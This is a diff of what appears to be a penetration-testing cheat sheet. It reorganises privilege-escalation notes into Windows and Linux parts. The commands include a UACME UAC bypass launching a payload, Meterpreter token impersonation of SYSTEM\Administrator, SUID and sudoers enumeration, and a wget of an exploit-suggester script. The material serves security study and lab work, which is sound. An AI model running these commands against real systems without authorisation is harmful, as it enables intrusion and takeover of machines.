@@ -762,31 +762,19 @@ set payload windows/meterpreter/reverse_tcp
 
 ## 4. Privilege Escalation
 
-Find **SUID** files! [GTFOBins](https://gtfobins.github.io/)
-```
-find / -perm -u=s -type f 2>/dev/null
-```
-```
-sudo -l
-```
-```
-cat /etc/sudoers
-```
 
+### 4.1 PrivEsc on Windows
 
-#### Bypassing UAC 
+Windows Exploit Suggester - Next Generation [here](https://github.com/bitsadmin/wesng)
 
+##### Bypassing UAC 
 Bypassing UAC using the [UACME](https://github.com/hfiref0x/UACME) tool. We need to compile this into binaries first! Such a bad day for skript kiddies :(
 ```
 Akagi64.exe 23 C:\Temp\payload.exe
 ```
 
-
-
-#### Token Impersonation
-
+##### Token Impersonation
 Here, we are looking for `SeImpersonatePrivilege` when we run `getprivs` command.
-
 ```
 meterpreter > load incognito 
 Loading extension incognito...Success.
@@ -794,6 +782,31 @@ Loading extension incognito...Success.
 meterpreter > list_tokens -u
 meterpreter > impersonate_token "SYSTEM\Administrator"
 ```
+
+
+### 4.2 PrivEsc on Linux
+
+Find **SUID** files! [GTFOBins](https://gtfobins.github.io/)
+```
+find / -perm -u=s -type f 2>/dev/null
+grep -rnw / -e "root"
+sudo -l
+cat /etc/sudoers
+```
+
+**Linux Exploit Suggester** [here](https://github.com/The-Z-Labs/linux-exploit-suggester)
+```
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
+```
+
+Misconfigured **Cron Jobs** are great!
+```
+crontab -l
+```
+
+
+
+
 
 #### Very Handy Links ;)
 
